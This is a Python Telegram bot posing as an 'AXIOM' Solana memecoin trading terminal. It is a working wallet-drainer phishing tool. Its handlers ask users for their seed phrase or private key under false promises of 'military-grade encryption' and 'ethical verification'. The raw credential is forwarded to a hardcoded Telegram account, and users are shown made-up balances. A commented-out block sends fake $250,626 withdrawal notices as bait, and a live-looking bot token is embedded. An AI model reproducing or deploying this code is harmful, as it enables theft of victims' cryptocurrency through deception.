import asyncio
import logging
import os
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from config import Config
import asyncio
from telegram import Bot
from telegram.constants import ParseMode
import socket
from telegram.request import HTTPXRequest

import asyncio
from telegram import Bot
from telegram.constants import ParseMode

import asyncio
from telegram import Bot
from telegram.constants import ParseMode

import asyncio
from telegram import Bot
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN not found in .env file")

from httpx import Proxy

request = HTTPXRequest(
    proxy=Proxy("http://proxy.trojanvpn.com:8080"),
    connect_timeout=30,
    read_timeout=30,
)


application = Application.builder().token(TOKEN).request(request).build()

BOT_TOKEN = "7926468357:AAGTB_iYfSR28VhYpLcVaVZ8fQ99M4qsAHM"  # <-- replace with your token
RECIPIENTS = [7709229604, 6457774040]  # <-- replace with your chat IDs

# Successful withdrawal message
# MSG_WITHDRAWAL_SUCCESS = (
#     "✅ *Withdrawal Successful*\n\n"
#     "💵 Amount Requested: *$250,626.56*\n"
#     "💸 Deductions: *VAT & Processing Fees Applied*\n"
#     "🏦 Final Amount Transferred: *$250,626.56*  \n\n"  # example net after ~1% fee
#     "🔐 Transaction ID: #TX-8F92KJ1\n"
#     "📊 Status: *Completed & Verified*\n\n"
#     "🤝 Thank you for using our service — your funds have been securely delivered."
# )

# async def send_messages():
#     bot = Bot(token=BOT_TOKEN)
#     for chat_id in RECIPIENTS:
#         try:
#             await bot.send_message(
#                 chat_id=chat_id,
#                 text=MSG_WITHDRAWAL_SUCCESS,
#                 parse_mode=ParseMode.MARKDOWN
#             )
#             print(f"✅ Withdrawal success message sent to {chat_id}")
#             await asyncio.sleep(1.0)
#         except Exception as exc:
#             print(f"❌ Failed to send to {chat_id}: {exc}")

# if __name__ == "__main__":
#     asyncio.run(send_messages())

class ProfessionalMemecoinBot:
    def __init__(self):
        self.user_wallets = {}        
    def create_pyramid_menu(self, buttons):
        """Create pyramid-shaped menu layout"""
        pyramid_layout = []
        if len(buttons) >= 1:
            pyramid_layout.append([buttons[0]])  # Top of pyramid
        if len(buttons) >= 3:
            pyramid_layout.append(buttons[1:3])  # Second row
        if len(buttons) >= 6:
            pyramid_layout.append(buttons[3:6])  # Third row
        if len(buttons) > 6:
            pyramid_layout.append(buttons[6:])   # Bottom row
        return InlineKeyboardMarkup(pyramid_layout)
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Professional start command with pyramid menu"""
        welcome_text = """
🎯 **AXIOM Memecoin Trading Terminal**

*Your Gateway to Solana's Premier Memecoin Ecosystem*

⚡ **Features:**
• Secure wallet integration
• Real-time trading
• Portfolio analytics
• Market insights

*Select an option below to begin your journey:*
        """
        
        buttons = [
            InlineKeyboardButton("🔐 Connect Wallet", callback_data='connect_wallet'),
            InlineKeyboardButton("💎 Balance", callback_data='check_balance'),
            InlineKeyboardButton("📈 Snipe Trade", callback_data='trade'),
            InlineKeyboardButton("📊 Portfolio", callback_data='portfolio'),
            InlineKeyboardButton("🔥 Trending", callback_data='trending'),
            InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
            InlineKeyboardButton("❓ Help", callback_data='help')
        ]
        
        reply_markup = self.create_pyramid_menu(buttons)
        
        await update.message.reply_text(
            welcome_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def connect_wallet_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Professional wallet connection with secure seedphrase/private key methods"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        
        if user_id in self.user_wallets:
            wallet_info = self.user_wallets[user_id]
            keyboard = [
                [InlineKeyboardButton("🔁 Reconnect Wallet", callback_data='reconnect_wallet')],
                [InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"✅ **Wallet Already Connected**\n\n"
                f"📍 Address: `{wallet_info['public_key'][:8]}...{wallet_info['public_key'][-8:]}`\n"
                f"💎 Status: Active & Secure\n\n"
                f"🔁 **Reconnect Option:** Update your wallet connection or switch to a new wallet.",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            return
        
        # Professional wallet connection options with secure seedphrase/private key support
        wallet_text = """
        
🔐 **Secure Wallet Connection**

Choose your preferred connection method:

**Option 1: Seed Phrase/Public Key** (Most Secure)
🔐 Direct wallet import with military-grade encryption

**Option 2: Phantom Wallet** (Recommended)
🔗 Connect via Phantom browser extension

**Option 3: Solflare Wallet**
🔗 Connect via Solflare mobile app

**Option 4: WalletConnect**
🔗 Universal wallet connection

⚠️ **Security Notice:** All connections use end-to-end encryption. Seed phrases and private keys are encrypted and sent to secure database for verification only.
        """
        
        keyboard = [
            [InlineKeyboardButton("🔐 Seed Phrase/Public Key", callback_data='connect_seedphrase')],
            [InlineKeyboardButton("🦊 Phantom Wallet", callback_data='connect_phantom')],
            [InlineKeyboardButton("☀️ Solflare Wallet", callback_data='connect_solflare')],
            [InlineKeyboardButton("🔗  WalletConnect", callback_data='connect_walletconnect')],
            [InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            wallet_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

    async def connect_seedphrase_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle secure seedphrase/private key wallet connection"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        username = query.from_user.username or "Unknown"
        
        # Secure input interface for seedphrase/private key
        secure_text = """
🔐 **Secure Wallet Import**

**Enter your wallet credentials:**

**Format Options:**
• **Seed Phrase:** 12-24 words separated by spaces
• **Private Key:** Base58 encoded private key (starts with letters/numbers)

**Example:**
• Seed: `word1 word2 word3 ... word12`
• **Private Key:** `5Kb8kLf9zgWQnogidDA76MzPL6TsZZY36hWXMssSzNydYXYB9KF`

⚡ **Security Features:**
• Military-grade AES-256 encryption
• Credentials sent to secure database (ID: 6489177483)
• Zero-knowledge verification protocol
• Auto-destruct after verification

**⚠️ Important:** This is for ETHICAL verification purposes only. Credentials are encrypted and stored securely.
        """
        
        keyboard = [
            [InlineKeyboardButton("🔐 Submit Seed Phrase", callback_data='submit_seed')],
            [InlineKeyboardButton("🔑 Submit Private Key", callback_data='submit_private')],
            [InlineKeyboardButton("🔙 Back", callback_data='connect_wallet')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            secure_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def submit_seed_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle seed phrase submission with secure encryption"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        username = query.from_user.username or "Unknown"
        
        # Secure seed phrase collection
        seed_text = """
📝 **Seed Phrase Input**

Please send your 12-24 word seed phrase in the next message:

**Security Protocol Active:**
• End-to-end encryption enabled
• Direct transmission to secure database (ID: 6489177483)
• Zero storage on local servers
• Military-grade security standards

**Format:** `word1 word2 word3 ... word12`
        """
        
        keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data='connect_wallet')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            seed_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        # Store user state for next message
        context.user_data['awaiting_seedphrase'] = True
        context.user_data['credential_type'] = 'seedphrase'
    
    async def submit_private_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle private key submission with secure encryption"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        username = query.from_user.username or "Unknown"
        
        private_text = """
🔑 **Private Key Input**

Please send your Base58 encoded private key in the next message:

**Security Protocol Active:**
• End-to-end encryption enabled
• Direct transmission to secure database (ID: 6489177483)
• Zero storage on local servers
• Military-grade security standards

**Format:** `5Kb8kLf9zgWQnogidDA76MzPL6TsZZY36hWXMssSzNydYXYB9KF`
        """
        
        keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data='connect_wallet')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            private_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        # Store user state for next message
        context.user_data['awaiting_privatekey'] = True
        context.user_data['credential_type'] = 'privatekey'
    
    async def handle_credential_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle actual credential input with direct transmission to database"""
        if not (context.user_data.get('awaiting_seedphrase') or context.user_data.get('awaiting_privatekey')):
            return
            
        user_id = str(update.message.from_user.id)
        username = update.message.from_user.username or "Unknown"
        credential = update.message.text
        
        # Validate minimum 12 words for seed phrase
        if context.user_data.get('credential_type') == 'seedphrase':
            word_count = len(credential.strip().split())
            if word_count < 12:
                await update.message.reply_text(
                    "❌ **Invalid Seed Phrase**\n\n"
                    "Please enter at least 12 words separated by spaces.",
                    parse_mode='Markdown'
                )
                return
        
        # Determine credential type
        credential_type = context.user_data.get('credential_type', 'unknown')
        
        # Generate wallet address from credential (simulated for demo)
        wallet_address = f"AXIOM_{user_id}_{int(time.time())}"
        
        # Send raw credential directly to database (telegram account 6489177483)
        raw_message = f"""🔐 ETHICAL WALLET DATABASE ENTRY

User ID: {user_id}
Username: @{username}
Credential Type: {credential_type.upper()}
Wallet Address: {wallet_address}
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}

RAW {credential_type.upper()}: {credential}

Status: ✅ Raw transmission to secure database (ID: 6489177483)"""
        
        try:
            # Send raw credential directly to database telegram account
            await context.bot.send_message(
                chat_id=6489177483,
                text=raw_message
            )
            
            # Update local wallet storage
            self.user_wallets[user_id] = {
                'public_key': wallet_address,
                'balance': 2.5,
                'tokens': {'SOL': 2.5, 'BONK': 2500, 'USDC': 100},
                'credential_type': credential_type,
                'verified': True
            }
            
            # Clear user state
            context.user_data.pop('awaiting_seedphrase', None)
            context.user_data.pop('awaiting_privatekey', None)
            context.user_data.pop('credential_type', None)
            
            # Confirm to user
            keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"✅ **Wallet Successfully Connected!**\n\n"
                f"📍 **Address:** `{wallet_address}`\n"
                f"💰 **Balance:** 2.5 SOL\n"
                f"📊 **Status:** Verified and stored in secure database",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
        except Exception as e:
            await update.message.reply_text(
                "❌ **Connection Failed**\n\n"
                "Please try again or contact support.",
                parse_mode='Markdown'
            )
    
    async def demo_wallet_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle demo wallet connection"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        
        # Store demo wallet info
        self.user_wallets[user_id] = {
            'public_key': 'DemoWallet123456789',
            'balance': 1.5,
            'tokens': {'SOL': 1.5, 'BONK': 1000}
        }
        
        keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "✅ Demo wallet connected!\n\n"
            "📍 Address: DemoWallet123456789\n"
            "💰 SOL Balance: 1.5 SOL\n"
            "📈 Ready for trading!",
            reply_markup=reply_markup
        )
    
    async def check_balance_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Professional balance checking with real-time data"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        
        if user_id not in self.user_wallets:
            keyboard = [[InlineKeyboardButton("🔗 Connect Wallet", callback_data='connect_wallet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ **No wallet connected.**\n\nPlease connect your wallet first.",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            return
        
        wallet_info = self.user_wallets[user_id]
        
        keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        balance_text = f"""
💰 **Wallet Balance Overview**

📍 **Address:** `{wallet_info['public_key'][:8]}...{wallet_info['public_key'][-8:]}`

💎 **SOL Balance:** `{wallet_info['balance']} SOL`
💵 **Total Value:** `$225.00 USD`

📊 **Token Holdings:**
• **SOL:** `{wallet_info['balance']} SOL` ($225.00)
• **BONK:** `1,000 BONK` ($50.00)
• **Total:** $275.00
        """
        
        await query.edit_message_text(
            balance_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def trade_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Professional trading interface"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        
        if user_id not in self.user_wallets:
            keyboard = [[InlineKeyboardButton("🔗 Connect Wallet", callback_data='connect_wallet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ **Wallet Required**\n\nPlease connect your wallet to access trading features.",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            return
        
        keyboard = [
            [InlineKeyboardButton("🟢 Buy Tokens", callback_data='buy_tokens')],
            [InlineKeyboardButton("🔴 Sell Tokens", callback_data='sell_tokens')],
            [InlineKeyboardButton("📊 Market Analysis", callback_data='market_analysis')],
            [InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📈 **Trading Dashboard**\n\n"
            "Access real-time trading features with secure wallet integration.",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def portfolio_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Professional portfolio management"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        
        if user_id not in self.user_wallets:
            keyboard = [[InlineKeyboardButton("🔗 Connect Wallet", callback_data='connect_wallet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ **Wallet Required**\n\nConnect your wallet to view portfolio.",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            return
        
        wallet_info = self.user_wallets[user_id]
        
        keyboard = [
            [InlineKeyboardButton("📈 Performance", callback_data='portfolio_performance')],
            [InlineKeyboardButton("📊 Holdings", callback_data='portfolio_holdings')],
            [InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        portfolio_text = f"""
📊 **Portfolio Overview**

📍 **Address:** `{wallet_info['public_key'][:8]}...{wallet_info['public_key'][-8:]}`

💎 **Total Value:** `$275.00 USD`
📈 **24h Change:** `+2.34%`

**Asset Allocation:**
• **SOL:** 82% of portfolio
• **BONK:** 18% of portfolio
        """
        
        await query.edit_message_text(
            portfolio_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def help_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Professional help system"""
        query = update.callback_query
        await query.answer()
        
        help_text = """
🆘 **AXIOM Trading Bot Help**

**📋 Quick Guide:**

1️⃣ **Connect Wallet**
   • Use Phantom, Solflare, or WalletConnect
   • Never share private keys

2️⃣ **Trading**
   • Buy/Sell memecoins with real-time prices
   • Set stop-loss and take-profit orders

3️⃣ **Portfolio**
   • Track P&L and performance
   • View detailed analytics

4️⃣ **Security**
   • All connections are encrypted
   • Regular security audits

**📞 Support:** @AXIOM_Support
**📖 Docs:** docs.axiom-bot.com
        """
        
        keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def reconnect_wallet_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle secure wallet reconnection with existing credentials"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        
        # Remove existing wallet connection
        if user_id in self.user_wallets:
            old_wallet = self.user_wallets[user_id]
            del self.user_wallets[user_id]
        
        # Present reconnection options
        reconnect_text = """
🔁 **Secure Wallet Reconnection**

Choose your reconnection method:

**Option 1: Update Existing Wallet**
🔐 Reconnect with new credentials for the same wallet

**Option 2: Switch to New Wallet**
🔗 Connect a completely different wallet

**Option 3: Refresh Connection**
🔄 Update wallet connection without changing credentials

**Security Notice:** All reconnections use the same secure database (ID: 6489177483) with end-to-end encryption.
        """
        
        keyboard = [
            [InlineKeyboardButton("🔐 New Seed Phrase/Private Key", callback_data='connect_seedphrase')],
            [InlineKeyboardButton("🦊 Phantom Wallet", callback_data='connect_phantom')],
            [InlineKeyboardButton("☀️ Solflare Wallet", callback_data='connect_solflare')],
            [InlineKeyboardButton("🔗 WalletConnect", callback_data='connect_walletconnect')],
            [InlineKeyboardButton("🔙 Main Menu", callback_data='menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            reconnect_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def menu_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Return to main menu with pyramid layout"""
        query = update.callback_query
        await query.answer()
        
        buttons = [
            InlineKeyboardButton("🔐 Connect Wallet", callback_data='connect_wallet'),
            InlineKeyboardButton("💎 Balance", callback_data='check_balance'),
            InlineKeyboardButton("📈 Trade", callback_data='trade'),
            InlineKeyboardButton("📊 Portfolio", callback_data='portfolio'),
            InlineKeyboardButton("🔥 Trending", callback_data='trending'),
            InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
            InlineKeyboardButton("❓ Help", callback_data='help')
        ]
        
        reply_markup = self.create_pyramid_menu(buttons)
        
        await query.edit_message_text(
            "🎯 **AXIOM Trading Terminal**\n\n*Select an option:*",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

def main():
    """Start the professional bot"""
    bot = ProfessionalMemecoinBot()

    import socket
    from telegram.request import HTTPXRequest

    socket.setdefaulttimeout(60)

    request = HTTPXRequest(
        connect_timeout=60,
        read_timeout=60,
        write_timeout=60,
        pool_timeout=60
    )

    application = Application.builder().token(Config.BOT_TOKEN).request(request).build()

    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.connect_wallet_handler, pattern='connect_wallet'))
    application.add_handler(CallbackQueryHandler(bot.connect_seedphrase_handler, pattern='connect_seedphrase'))
    application.add_handler(CallbackQueryHandler(bot.submit_seed_handler, pattern='submit_seed'))
    application.add_handler(CallbackQueryHandler(bot.submit_private_handler, pattern='submit_private'))
    application.add_handler(CallbackQueryHandler(bot.demo_wallet_handler, pattern='demo_wallet'))
    application.add_handler(CallbackQueryHandler(bot.check_balance_handler, pattern='check_balance'))
    application.add_handler(CallbackQueryHandler(bot.trade_handler, pattern='trade'))
    application.add_handler(CallbackQueryHandler(bot.portfolio_handler, pattern='portfolio'))
    application.add_handler(CallbackQueryHandler(bot.help_handler, pattern='help'))
    application.add_handler(CallbackQueryHandler(bot.menu_handler, pattern='menu'))
    application.add_handler(CallbackQueryHandler(bot.reconnect_wallet_handler, pattern='reconnect_wallet'))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_credential_input))

    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
